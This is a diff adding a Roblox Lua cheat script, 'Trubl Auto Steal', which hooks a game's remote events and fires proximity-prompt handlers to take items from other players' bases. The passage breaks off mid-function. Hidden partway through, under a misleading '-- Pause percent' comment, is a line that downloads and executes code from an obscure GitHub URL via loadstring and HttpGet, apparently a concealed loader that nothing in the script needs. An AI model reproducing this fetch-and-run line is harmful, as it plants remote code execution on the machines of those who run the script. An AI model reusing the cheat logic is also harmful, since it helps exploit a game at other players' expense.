@@ -1,0 +1,1256 @@
+-- Trubl Auto Steal
+-- Roblox auto-steal script (Steal a Brainrot style)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- Cleanup any previous instance
+if _G.TrublAutoSteal then
+	pcall(function()
+		_G.TrublAutoSteal.Stop()
+	end)
+	_G.TrublAutoSteal = nil
+end
+
+do
+	local existing = LocalPlayer:FindFirstChild("PlayerGui")
+		and LocalPlayer.PlayerGui:FindFirstChild("TrublAutoStealUI")
+	if existing then
+		existing:Destroy()
+	end
+end
+
+while not LocalPlayer do
+	task.wait()
+	LocalPlayer = Players.LocalPlayer
+end
+
+while not LocalPlayer:FindFirstChild("PlayerGui") do
+	task.wait()
+end
+
+-- Configuration
+local Config = {
+	AutoStealEnabled = true,
+	StealRadius = 62,
+	StealDuration = 1.3,
+	PausePercent = 10,
+	ContinueRadius = 10,
+	WaitTimeout = 1.9,
+	UseSimpleSteal = true,
+	UseSemiLogic = false,
+}
+
+local Constants = {
+	STEAL_DURATION = Config.StealDuration,
+	STEAL_RADIUS = Config.StealRadius,
+}
+
+-- State
+local isStealing = false
+local promptCache = {}
+local stealingStartTime = nil
+local heartbeatConnection = nil
+local scanConnection = nil
+local isRagdolled = false
+local characterConnections = nil
+
+-- UI colors
+local accentColor = Color3.fromRGB(100, 30, 100)
+local darkColor = Color3.fromRGB(10, 10, 10)
+local panelColor = Color3.fromRGB(30, 10, 10)
+local brightText = Color3.fromRGB(255, 255, 255)
+local mutedText = Color3.fromRGB(160, 100, 160)
+local blackColor = Color3.fromRGB(0, 0, 0)
+local tweenInfo = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+-- ============================
+-- UI Construction
+-- ============================
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TrublAutoStealUI"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = LocalPlayer.PlayerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 264, 0, 60)
+mainFrame.Position = UDim2.new(0.5, -132, 0, 16)
+mainFrame.BackgroundColor3 = panelColor
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Active = true
+mainFrame.Parent = screenGui
+
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
+
+do
+	local stroke = Instance.new("UIStroke", mainFrame)
+	stroke.Color = accentColor
+	stroke.Thickness = 2
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+end
+
+-- Dragging
+local isDragging = false
+local dragStart = nil
+local startPosition = nil
+local isLocked = false
+local activeTouch = nil
+
+mainFrame.InputBegan:Connect(function(input)
+	if isLocked then return end
+
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		isDragging = true
+		dragStart = input.Position
+		startPosition = mainFrame.Position
+	elseif input.UserInputType == Enum.UserInputType.Touch then
+		if activeTouch ~= nil then return end
+		activeTouch = input
+		isDragging = true
+		dragStart = input.Position
+		startPosition = mainFrame.Position
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if isDragging
+		and (input.UserInputType == Enum.UserInputType.MouseMovement
+			or input.UserInputType == Enum.UserInputType.Touch)
+	then
+		local delta = input.Position - dragStart
+		mainFrame.Position = UDim2.new(
+			startPosition.X.Scale,
+			startPosition.X.Offset + delta.X,
+			startPosition.Y.Scale,
+			startPosition.Y.Offset + delta.Y
+		)
+	end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or (input.UserInputType == Enum.UserInputType.Touch and input == activeTouch)
+	then
+		if isDragging then
+			isDragging = false
+			activeTouch = nil
+			pcall(function()
+				if writefile then
+					writefile(
+						"TrublAutoSteal_Pos",
+						mainFrame.Position.X.Offset .. "," .. mainFrame.Position.Y.Offset
+					)
+				end
+			end)
+		end
+	end
+end)
+
+-- Top bar
+local topBar = Instance.new("Frame")
+topBar.Name = "TopBar"
+topBar.Size = UDim2.new(1, 0, 0, 32)
+topBar.BackgroundTransparency = 1
+topBar.BorderSizePixel = 0
+topBar.ClipsDescendants = true
+topBar.ZIndex = 5
+topBar.Parent = mainFrame
+
+local progressTrack = Instance.new("Frame")
+progressTrack.Name = "ProgressTrack"
+progressTrack.Size = UDim2.new(1, -10, 0, 24)
+progressTrack.Position = UDim2.new(0, 5, 0, 4)
+progressTrack.BackgroundColor3 = panelColor
+progressTrack.BorderSizePixel = 0
+progressTrack.ZIndex = 5
+progressTrack.Parent = topBar
+Instance.new("UICorner", progressTrack).CornerRadius = UDim.new(0, 6)
+
+local progressFill = Instance.new("Frame")
+progressFill.Name = "Fill"
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.BackgroundColor3 = accentColor
+progressFill.BorderSizePixel = 0
+progressFill.ZIndex = 3
+progressFill.Parent = progressTrack
+Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 6)
+
+local fpsLabel = Instance.new("TextLabel")
+fpsLabel.Size = UDim2.new(0, 48, 0, 10)
+fpsLabel.Position = UDim2.new(0, 10, 0, 4)
+fpsLabel.BackgroundTransparency = 1
+fpsLabel.TextColor3 = mutedText
+fpsLabel.Font = Enum.Font.GothamBold
+fpsLabel.TextSize = 9
+fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
+fpsLabel.ZIndex = 6
+fpsLabel.Parent = topBar
+
+local pingLabel = Instance.new("TextLabel")
+pingLabel.Size = UDim2.new(0, 48, 0, 10)
+pingLabel.Position = UDim2.new(0, 10, 0, 15)
+pingLabel.BackgroundTransparency = 1
+pingLabel.TextColor3 = mutedText
+pingLabel.Font = Enum.Font.GothamBold
+pingLabel.TextSize = 8
+pingLabel.TextXAlignment = Enum.TextXAlignment.Left
+pingLabel.ZIndex = 6
+pingLabel.Parent = topBar
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -80, 0, 16)
+titleLabel.Position = UDim2.new(0, 40, 0, 8)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Trubl Auto Steal"
+titleLabel.TextColor3 = brightText
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 13
+titleLabel.TextStrokeTransparency = 1
+titleLabel.TextStrokeColor3 = blackColor
+titleLabel.ZIndex = 6
+titleLabel.Parent = topBar
+
+local arrowButton = Instance.new("TextButton")
+arrowButton.Name = "ArrowButton"
+arrowButton.Size = UDim2.new(0, 28, 0, 16)
+arrowButton.Position = UDim2.new(1, -30, 0.5, -8)
+arrowButton.BackgroundTransparency = 1
+arrowButton.Text = "▼"
+arrowButton.TextColor3 = mutedText
+arrowButton.Font = Enum.Font.GothamBold
+arrowButton.TextSize = 11
+arrowButton.ZIndex = 10
+arrowButton.Parent = topBar
+
+-- Lock button
+local lockButton = Instance.new("TextButton")
+lockButton.Name = "LockButton"
+lockButton.Size = UDim2.new(0, 80, 0, 22)
+lockButton.Position = UDim2.new(0, 174, 0, 45)
+lockButton.BackgroundColor3 = accentColor
+lockButton.BackgroundTransparency = 0
+lockButton.Text = "DRAG"
+lockButton.TextColor3 = brightText
+lockButton.Font = Enum.Font.GothamBold
+lockButton.TextSize = 10
+lockButton.TextXAlignment = Enum.TextXAlignment.Center
+lockButton.ZIndex = 10
+lockButton.Parent = mainFrame
+Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 4)
+
+lockButton.MouseButton1Click:Connect(function()
+	isLocked = not isLocked
+	lockButton.BackgroundColor3 = isLocked and darkColor or accentColor
+	lockButton.Text = isLocked and "LOCKED" or "DRAG"
+	pcall(function()
+		if writefile then
+			writefile("TrublAutoSteal_Locked", tostring(isLocked))
+		end
+	end)
+end)
+
+-- Settings panel
+local panel = Instance.new("Frame")
+panel.Name = "Panel"
+panel.Size = UDim2.new(1, -10, 0, 100)
+panel.Position = UDim2.new(0, 5, 0, 34)
+panel.BackgroundTransparency = 1
+panel.BorderSizePixel = 0
+panel.Visible = false
+panel.ZIndex = 5
+panel.Parent = mainFrame
+
+local radiusLabel = Instance.new("TextLabel")
+radiusLabel.Size = UDim2.new(0, 40, 0, 10)
+radiusLabel.Position = UDim2.new(0, 7, 0, 0)
+radiusLabel.BackgroundTransparency = 1
+radiusLabel.Text = "RADIUS"
+radiusLabel.TextColor3 = mutedText
+radiusLabel.Font = Enum.Font.GothamBold
+radiusLabel.TextSize = 8
+radiusLabel.TextXAlignment = Enum.TextXAlignment.Left
+radiusLabel.ZIndex = 6
+radiusLabel.Parent = panel
+
+local radiusInput = Instance.new("TextBox")
+radiusInput.Name = "RadiusInput"
+radiusInput.Size = UDim2.new(0, 74, 0, 24)
+radiusInput.Position = UDim2.new(0, 5, 0, 11)
+radiusInput.BackgroundColor3 = panelColor
+radiusInput.BorderSizePixel = 0
+radiusInput.Text = tostring(Config.StealRadius)
+radiusInput.TextColor3 = brightText
+radiusInput.Font = Enum.Font.GothamBold
+radiusInput.TextSize = 10
+radiusInput.ClearTextOnFocus = true
+radiusInput.TextXAlignment = Enum.TextXAlignment.Center
+radiusInput.PlaceholderText = "Radius"
+radiusInput.ZIndex = 8
+radiusInput.Parent = panel
+Instance.new("UICorner", radiusInput).CornerRadius = UDim.new(0, 6)
+
+do
+	local stroke = Instance.new("UIStroke", radiusInput)
+	stroke.Color = blackColor
+	stroke.Thickness = 1
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	radiusInput.Focused:Connect(function()
+		stroke.Color = accentColor
+	end)
+	radiusInput.FocusLost:Connect(function()
+		stroke.Color = blackColor
+	end)
+end
+
+-- Mode buttons frame
+local modeFrame = Instance.new("Frame")
+modeFrame.Name = "ModeFrame"
+modeFrame.Size = UDim2.new(1, 0, 0, 30)
+modeFrame.Position = UDim2.new(0, 0, 0, 40)
+modeFrame.BackgroundColor3 = panelColor
+modeFrame.BorderSizePixel = 0
+modeFrame.ZIndex = 8
+modeFrame.Parent = panel
+Instance.new("UICorner", modeFrame).CornerRadius = UDim.new(0, 7)
+
+do
+	local stroke = Instance.new("UIStroke", modeFrame)
+	stroke.Color = Color3.fromRGB(10, 10, 10)
+	stroke.Thickness = 1
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+end
+
+local modeNames = { "Normal", "Semi", "Semi Normal" }
+local currentModeIndex = 1
+
+local function createModeButton(text, xPos, width)
+	local btn = Instance.new("TextButton")
+	btn.Name = "ModeButton_" .. text
+	btn.Size = UDim2.new(0, width, 0, 24)
+	btn.Position = UDim2.new(0, xPos, 0.5, -11)
+	btn.BackgroundColor3 = darkColor
+	btn.BorderSizePixel = 0
+	btn.Text = text
+	btn.TextColor3 = brightText
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 11
+	btn.ZIndex = 8
+	btn.Parent = modeFrame
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
+	local stroke = Instance.new("UIStroke", btn)
+	stroke.Color = panelColor
+	stroke.Thickness = 1
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	return btn
+end
+
+local normalButton = createModeButton("Normal", 3, 78)
+local semiButton = createModeButton("Semi", 85, 78)
+local semiNormalButton = createModeButton("Semi Normal", 167, 78)
+
+local function refreshModeButtons()
+	local current = modeNames[currentModeIndex]
+	normalButton.BackgroundColor3 = current == "Normal" and accentColor or darkColor
+	semiButton.BackgroundColor3 = current == "Semi" and accentColor or darkColor
+	semiNormalButton.BackgroundColor3 = current == "Semi Normal" and accentColor or darkColor
+end
+
+local function applyMode(mode)
+	if mode == "Normal" then
+		Config.UseSimpleSteal = true
+		Config.UseSemiLogic = false
+	elseif mode == "Semi" then
+		Config.UseSimpleSteal = false
+		Config.UseSemiLogic = true
+		Config.HoldMin = 1.3
+		Config.HoldMax = 2.6
+		Config.EntryDelay = 0.3
+		Config.SemiCooldown = 0.05
+		Config.ContinueRadius = 10
+	elseif mode == "Semi Normal" then
+		Config.UseSimpleSteal = false
+		Config.UseSemiLogic = false
+		Config.WaitTimeout = 1.7
+		Config.ContinueRadius = 10
+	end
+end
+
+local function setMode(mode)
+	for i, name in ipairs(modeNames) do
+		if name == mode then
+			currentModeIndex = i
+			break
+		end
+	end
+	applyMode(mode)
+	refreshModeButtons()
+	pcall(function()
+		if writefile then
+			writefile("TrublAutoSteal_Mode", mode)
+		end
+	end)
+end
+
+refreshModeButtons()
+
+normalButton.MouseButton1Click:Connect(function()
+	setMode("Normal")
+end)
+semiButton.MouseButton1Click:Connect(function()
+	setMode("Semi")
+end)
+semiNormalButton.MouseButton1Click:Connect(function()
+	setMode("Semi Normal")
+end)
+
+-- Pause percent
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
+local pauseLabel = Instance.new("TextLabel")
+pauseLabel.Size = UDim2.new(0, 80, 0, 10)
+pauseLabel.Position = UDim2.new(0, 80, 0, 0)
+pauseLabel.BackgroundTransparency = 1
+pauseLabel.Text = "PAUSE %"
+pauseLabel.TextColor3 = mutedText
+pauseLabel.Font = Enum.Font.GothamBold
+pauseLabel.TextSize = 8
+pauseLabel.TextXAlignment = Enum.TextXAlignment.Left
+pauseLabel.ZIndex = 6
+pauseLabel.Parent = panel
+
+local pauseInput = Instance.new("TextBox")
+pauseInput.Size = UDim2.new(0, 80, 0, 22)
+pauseInput.Position = UDim2.new(0, 86, 0, 11)
+pauseInput.BackgroundColor3 = panelColor
+pauseInput.BorderSizePixel = 0
+pauseInput.Text = tostring(Config.PausePercent)
+pauseInput.TextColor3 = brightText
+pauseInput.Font = Enum.Font.GothamBold
+pauseInput.TextSize = 10
+pauseInput.ClearTextOnFocus = true
+pauseInput.TextXAlignment = Enum.TextXAlignment.Center
+pauseInput.PlaceholderText = "Pause %"
+pauseInput.ZIndex = 6
+pauseInput.Parent = panel
+Instance.new("UICorner", pauseInput).CornerRadius = UDim.new(0, 6)
+
+do
+	local stroke = Instance.new("UIStroke", pauseInput)
+	stroke.Color = blackColor
+	stroke.Thickness = 1
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	pauseInput.Focused:Connect(function()
+		stroke.Color = accentColor
+	end)
+	pauseInput.FocusLost:Connect(function()
+		stroke.Color = blackColor
+		local value = tonumber(pauseInput.Text)
+		if value and value >= 1 and value <= 100 then
+			Config.PausePercent = value
+			pauseInput.Text = tostring(value)
+			pcall(function()
+				if writefile then
+					writefile("TrublAutoSteal_PausePct", tostring(value))
+				end
+			end)
+		else
+			pauseInput.Text = tostring(Config.PausePercent)
+		end
+	end)
+end
+
+-- Panel toggle
+local panelOpen = false
+arrowButton.MouseButton1Click:Connect(function()
+	panelOpen = not panelOpen
+	if panelOpen then
+		panel.Visible = true
+		arrowButton.Text = "▲"
+		TweenService:Create(mainFrame, tweenInfo, {
+			Size = UDim2.new(0, 264, 0, 110),
+		}):Play()
+	else
+		arrowButton.Text = "▼"
+		local tween = TweenService:Create(mainFrame, tweenInfo, {
+			Size = UDim2.new(0, 264, 0, 60),
+		})
+		tween:Play()
+		tween.Completed:Connect(function()
+			if not panelOpen then
+				panel.Visible = false
+			end
+		end)
+	end
+end)
+
+-- FPS / ping updater
+do
+	local lastUpdate = 0
+	RunService.Heartbeat:Connect(function(deltaTime)
+		local now = tick()
+		if now - lastUpdate < 0.5 then return end
+		lastUpdate = now
+
+		local ping = 0
+		pcall(function()
+			ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
+		end)
+
+		fpsLabel.Text = math.floor(1 / deltaTime) .. " FPS"
+		pingLabel.Text = ping .. " MS"
+	end)
+end
+
+-- ============================
+-- Persistence load
+-- ============================
+
+pcall(function()
+	if readfile and isfile then
+		if isfile("TrublAutoSteal_Pos") then
+			local x, y = readfile("TrublAutoSteal_Pos"):match("([%-%.%d]+),([%-%.%d]+)")
+			if x and y then
+				mainFrame.Position = UDim2.new(0, tonumber(x), 0, tonumber(y))
+			end
+		end
+
+		if isfile("TrublAutoSteal_Locked") and readfile("TrublAutoSteal_Locked") == "true" then
+			isLocked = true
+			lockButton.BackgroundColor3 = darkColor
+			lockButton.Text = "LOCKED"
+		end
+
+		if isfile("TrublAutoSteal_Radius") then
+			local r = tonumber(readfile("TrublAutoSteal_Radius"))
+			if r and r > 0 then
+				Config.StealRadius = r
+				Constants.STEAL_RADIUS = r
+				radiusInput.Text = tostring(r)
+			end
+		end
+
+		if isfile("TrublAutoSteal_Mode") then
+			local mode = readfile("TrublAutoSteal_Mode")
+			for i, name in ipairs(modeNames) do
+				if name == mode then
+					currentModeIndex = i
+					applyMode(mode)
+					refreshModeButtons()
+					break
+				end
+			end
+		end
+
+		if isfile("TrublAutoSteal_PausePct") then
+			local p = tonumber(readfile("TrublAutoSteal_PausePct"))
+			if p and p >= 1 and p <= 100 then
+				Config.PausePercent = p
+				pauseInput.Text = tostring(p)
+			end
+		end
+	end
+end)
+
+radiusInput.FocusLost:Connect(function()
+	local r = tonumber(radiusInput.Text)
+	if r and r > 0 then
+		Config.StealRadius = r
+		Constants.STEAL_RADIUS = r
+		radiusInput.Text = tostring(r)
+		pcall(function()
+			if writefile then
+				writefile("TrublAutoSteal_Radius", tostring(r))
+			end
+		end)
+	else
+		radiusInput.Text = tostring(Config.StealRadius)
+	end
+end)
+
+-- ============================
+-- Core logic
+-- ============================
+
+local function resetProgressBar()
+	progressFill.Size = UDim2.new(0, 0, 1, 0)
+end
+
+local function getCharacterRoot()
+	local char = LocalPlayer.Character
+	if not char then return nil end
+	return char:FindFirstChild("HumanoidRootPart")
+end
+
+-- Plot data cache
+local plotData = {}
+local plotListeners = {}
+local animalListReference = nil
+local animalRegistry = {}
+local promptReferences = {}
+local isRemoteHooked = false
+
+local function parseAnimalIdentifier(str)
+	local parts = {}
+	for token in string.gmatch(tostring(str), "[^%.]+") do
+		table.insert(parts, tonumber(token) or token)
+	end
+	return parts
+end
+
+local function applyRemoteUpdate(plotName, eventData)
+	local plot = plotData[plotName]
+	if type(plot) ~= "table" then return end
+
+	local eventType = eventData[2]
+	local value = eventData[3]
+	local key = eventData[4]
+	local parent = nil
+	local finalKey = nil
+	local cursor = plot
+
+	for _, part in ipairs(parseAnimalIdentifier(eventData[1])) do
+		if cursor and cursor[part] then
+			parent = cursor
+			finalKey = part
+			cursor = cursor[part]
+		else
+			parent = cursor
+			finalKey = part
+			cursor = nil
+		end
+	end
+
+	if eventType == "Changed" then
+		if parent then parent[finalKey] = value end
+	elseif eventType == "ListInserted" then
+		if cursor then table.insert(cursor, key, value) end
+	elseif eventType == "ListRemoved" then
+		if cursor then table.remove(cursor, key) end
+	elseif eventType == "DictionaryInserted" then
+		if cursor then cursor[key] = value end
+	elseif eventType == "DictionaryRemoved" then
+		if cursor then cursor[key] = nil end
+	end
+end
+
+-- Hook the Synchronizer channel for a plot
+local function hookPlot(plotModel)
+	if plotListeners[plotModel] then return end
+
+	local plotName = tostring(plotModel.Name)
+	local plotsFolder = workspace:FindFirstChild("Plots")
+	if not plotsFolder or not plotsFolder:FindFirstChild(plotName) then return end
+
+	if plotData[plotName] == nil then
+		local syncChannel = plotModel
+		-- We look up the channel via Synchronizer
+		local synchronizer = ReplicatedStorage
+			:FindFirstChild("Packages")
+			and ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
+		local channel = synchronizer and synchronizer:FindFirstChild("Channel")
+		local remote = channel and channel:FindFirstChild(plotName)
+
+		if remote then
+			local ok, result = pcall(function()
+				return remote:InvokeServer(plotName)
+			end)
+			plotData[plotName] = (ok and type(result) == "table") and result or {}
+		else
+			plotData[plotName] = {}
+		end
+	end
+
+	plotListeners[plotModel] = plotModel.OnClientEvent:Connect(function(payload)
+		for _, entry in ipairs(payload) do
+			applyRemoteUpdate(plotName, entry)
+		end
+	end)
+end
+
+-- Read the owner display name from a plot sign
+local function getPlotOwner(plotModel)
+	local plotSign = plotModel:FindFirstChild("PlotSign")
+	local frame = plotSign
+		and plotSign:FindFirstChild("SurfaceGui")
+		and plotSign.SurfaceGui:FindFirstChild("Frame")
+	frame = frame and frame:FindFirstChild("TextLabel")
+	if not frame or frame.Text == "Empty Base" then return nil end
+	return frame.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
+end
+
+local function isMyPlot(entry)
+	local plotsFolder = workspace:FindFirstChild("Plots")
+	if not plotsFolder then return false end
+	local plotModel = plotsFolder:FindFirstChild(entry.plot)
+	if not plotModel then return false end
+	return getPlotOwner(plotModel) == LocalPlayer.DisplayName
+end
+
+local function getPromptPosition(entry)
+	local plotsFolder = workspace:FindFirstChild("Plots")
+	if not plotsFolder then return nil end
+	local plotModel = plotsFolder:FindFirstChild(entry.plot)
+	if not plotModel then return nil end
+
+	local podiums = plotModel:FindFirstChild("AnimalPodiums")
+	if not podiums then return nil end
+	local slot = podiums:FindFirstChild(entry.slot)
+	if not slot then return nil end
+	return slot:GetPivot().Position
+end
+
+-- Collect all stealable animals on other people's plots
+local function refreshAnimalRegistry()
+	local plotsFolder = workspace:FindFirstChild("Plots")
+	if not plotsFolder then return end
+
+	local entries = {}
+	for _, plotModel in ipairs(plotsFolder:GetChildren()) do
+		local cached = plotData[plotModel.Name]
+		local list = cached and cached.AnimalList
+
+		if type(list) == "table" then
+			for slotIndex, animal in pairs(list) do
+				if type(animal) == "table" then
+					if animalRegistry and animalRegistry[animal.Index] then
+						table.insert(entries, {
+							plot = plotModel.Name,
+							slot = tostring(slotIndex),
+							uid = plotModel.Name .. "_" .. tostring(slotIndex),
+						})
+					end
+				end
+			end
+		end
+	end
+
+	promptReferences = entries
+end
+
+-- Hook the synchronizer remotes
+local function setupSynchronizerHooks()
+	if isRemoteHooked then return end
+	isRemoteHooked = true
+
+	pcall(function()
+		local packages = ReplicatedStorage:WaitForChild("Packages", 10)
+		local datas = ReplicatedStorage:WaitForChild("Datas", 10)
+		local plots = workspace:WaitForChild("Plots", 10)
+
+		local ok, result = pcall(require, datas:WaitForChild("Animals", 10))
+		if not ok then
+			isRemoteHooked = false
+			return
+		end
+		animalRegistry = result
+
+		local synchronizer = packages:WaitForChild("Synchronizer", 10)
+		local channel = synchronizer:WaitForChild("Channel", 10)
+		local plotRemote = synchronizer:FindFirstChild("PlotRemote")
+
+		local function attach(child)
+			if plotListeners[child] then return end
+			local name = tostring(child.Name)
+			if not plots:FindFirstChild(name) then return end
+
+			if plotData[name] == nil then
+				if plotRemote then
+					local ok2, res = pcall(function()
+						return plotRemote:InvokeServer(name)
+					end)
+					plotData[name] = (ok2 and type(res) == "table") and res or {}
+				else
+					plotData[name] = {}
+				end
+			end
+
+			plotListeners[child] = child.OnClientEvent:Connect(function(payload)
+				for _, entry in ipairs(payload) do
+					applyRemoteUpdate(name, entry)
+				end
+			end)
+		end
+
+		for _, child in ipairs(channel:GetChildren()) do
+			if child:IsA("RemoteEvent") then
+				attach(child)
+			end
+		end
+
+		channel.ChildAdded:Connect(function(child)
+			if child:IsA("RemoteEvent") then
+				attach(child)
+			end
+		end)
+	end)
+end
+
+-- Find closest prompt to steal
+local function findClosestPrompt()
+	local root = getCharacterRoot()
+	if not root then return nil end
+
+	local closest = nil
+	local closestDistance = math.huge
+
+	for _, entry in ipairs(promptReferences) do
+		if not isMyPlot(entry) then
+			local pos = getPromptPosition(entry)
+			if pos then
+				local dist = (pos - root.Position).Magnitude
+				if dist < closestDistance and dist <= Constants.STEAL_RADIUS then
+					local cached = promptReferences[entry.uid]
+					if cached and cached.Parent then
+						closestDistance = dist
+						closest = cached
+					else
+						local plotsFolder = workspace:FindFirstChild("Plots")
+						local plotModel = plotsFolder and plotsFolder:FindFirstChild(entry.plot)
+						local podiums = plotModel and plotModel:FindFirstChild("AnimalPodiums")
+						local slot = podiums and podiums:FindFirstChild(entry.slot)
+						local base = slot and slot:FindFirstChild("Base")
+						local spawn = base and base:FindFirstChild("Spawn")
+						local promptAttachment = spawn and spawn:FindFirstChild("PromptAttachment")
+
+						if promptAttachment then
+							for _, child in ipairs(promptAttachment:GetChildren()) do
+								if child:IsA("ProximityPrompt") then
+									promptReferences[entry.uid] = child
+									closest = child
+									closestDistance = dist
+									break
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+
+	return closest
+end
+
+-- Ragdoll detection
+do
+	local ragdollCount = 0
+
+	local function bindCharacter(character)
+		local humanoid = character:WaitForChild("Humanoid", 5)
+		if not humanoid then return end
+
+		if characterConnections then
+			for _, conn in ipairs(characterConnections) do
+				conn:Disconnect()
+			end
+			characterConnections = nil
+		end
+
+		local lastStateChange = 0
+
+		local function markRagdoll()
+			if isRagdolled then return end
+			isRagdolled = true
+			lastStateChange = tick()
+			ragdollCount += 1
+			local snapshot = ragdollCount
+
+			if not Config.UseSimpleSteal and not Config.UseSemiLogic then
+				if heartbeatConnection then
+					heartbeatConnection:Disconnect()
+					heartbeatConnection = nil
+				end
+				isStealing = false
+				promptCache = {}
+				stealingStartTime = nil
+				resetProgressBar()
+			end
+
+			task.spawn(function()
+				task.wait(0.5)
+				if ragdollCount == snapshot then
+					isRagdolled = false
+				end
+			end)
+		end
+
+		local function clearRagdoll()
+			if tick() - lastStateChange < 1 then return end
+			if isRagdolled then
+				isRagdolled = false
+			end
+		end
+
+		local conn1 = humanoid.StateChanged:Connect(function(_, newState)
+			if newState == Enum.HumanoidStateType.Physics
+				or newState == Enum.HumanoidStateType.Ragdoll
+			then
+				markRagdoll()
+			elseif newState == Enum.HumanoidStateType.GettingUp then
+				clearRagdoll()
+			end
+		end)
+
+		local conn2 = humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
+			if humanoid.PlatformStand then
+				markRagdoll()
+			else
+				clearRagdoll()
+			end
+		end)
+
+		characterConnections = { conn1, conn2 }
+	end
+
+	if LocalPlayer.Character then
+		bindCharacter(LocalPlayer.Character)
+	end
+
+	LocalPlayer.CharacterAdded:Connect(function(character)
+		task.wait(1)
+		bindCharacter(character)
+	end)
+end
+
+-- Attempt steal from a prompt
+local function beginSteal(prompt)
+	if isStealing then return end
+	if isRagdolled then return end
+	if not prompt or not prompt.Parent then return end
+
+	if not promptCache[prompt] then
+		promptCache[prompt] = { hold = {}, trigger = {}, ready = true }
+
+		pcall(function()
+			if getconnections then
+				for _, conn in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
+					if conn.Function then
+						table.insert(promptCache[prompt].hold, conn.Function)
+					end
+				end
+				for _, conn in ipairs(getconnections(prompt.Triggered)) do
+					if conn.Function then
+						table.insert(promptCache[prompt].trigger, conn.Function)
+					end
+				end
+			end
+		end)
+	end
+
+	local cache = promptCache[prompt]
+	if not cache.ready then return end
+
+	cache.ready = false
+	isStealing = true
+	stealingStartTime = tick()
+	resetProgressBar()
+
+	for _, fn in ipairs(cache.hold) do
+		task.spawn(fn)
+	end
+
+	if heartbeatConnection then
+		heartbeatConnection:Disconnect()
+	end
+
+	-- Simple mode
+	if Config.UseSimpleSteal then
+		heartbeatConnection = RunService.Heartbeat:Connect(function()
+			if not isStealing then
+				heartbeatConnection:Disconnect()
+				return
+			end
+
+			local ratio = math.clamp((tick() - stealingStartTime) / Constants.STEAL_DURATION, 0, 1)
+			progressFill.Size = UDim2.new(ratio, 0, 1, 0)
+
+			local root = getCharacterRoot()
+			if root and prompt and prompt.Parent then
+				local parent = prompt.Parent.Parent
+				if parent and parent:IsA("BasePart") then
+					if (parent.Position - root.Position).Magnitude > Constants.STEAL_RADIUS then
+						heartbeatConnection:Disconnect()
+						heartbeatConnection = nil
+						isStealing = false
+						cache.ready = true
+						resetProgressBar()
+						return
+					end
+				end
+			end
+
+			if ratio >= 1 then
+				heartbeatConnection:Disconnect()
+				heartbeatConnection = nil
+				for _, fn in ipairs(cache.trigger) do
+					task.spawn(fn)
+				end
+				resetProgressBar()
+				cache.ready = true
+				isStealing = false
+			end
+		end)
+		return
+	end
+
+	-- Semi logic
+	if Config.UseSemiLogic then
+		local holdMin = Config.HoldMin or 1.3
+		local holdMax = Config.HoldMax or 2.6
+		local entryDelay = Config.EntryDelay or 0.3
+		local semiCooldown = Config.SemiCooldown or 0.05
+		local continueRadius = Config.ContinueRadius or 10
+		local inRangeAtStart = false
+		local root = getCharacterRoot()
+
+		if root and prompt and prompt.Parent then
+			local parent = prompt.Parent.Parent
+			if parent and parent:IsA("BasePart") then
+				inRangeAtStart = (parent.Position - root.Position).Magnitude <= continueRadius
+			end
+		end
+
+		local phase = "holding"
+		heartbeatConnection = RunService.Heartbeat:Connect(function()
+			if not isStealing then
+				heartbeatConnection:Disconnect()
+				return
+			end
+
+			local elapsed = tick() - stealingStartTime
+			progressFill.Size = UDim2.new(math.clamp(elapsed / holdMax, 0, 1), 0, 1, 0)
+
+			local root2 = getCharacterRoot()
+			if root2 and prompt and prompt.Parent then
+				local parent = prompt.Parent.Parent
+				if parent and parent:IsA("BasePart") then
+					if (parent.Position - root2.Position).Magnitude > Constants.STEAL_RADIUS then
+						heartbeatConnection:Disconnect()
+						heartbeatConnection = nil
+						isStealing = false
+						cache.ready = true
+						resetProgressBar()
+						return
+					end
+				end
+			end
+
+			if phase == "holding" then
+				if elapsed >= holdMin then
+					phase = "waitingRange"
+				end
+			elseif phase == "waitingRange" then
+				if elapsed > holdMax then
+					heartbeatConnection:Disconnect()
+					heartbeatConnection = nil
+					isStealing = false
+					cache.ready = true
+					resetProgressBar()
+					return
+				end
+
+				local parent = root2 and prompt and prompt.Parent
+				local within = false
+				if parent then
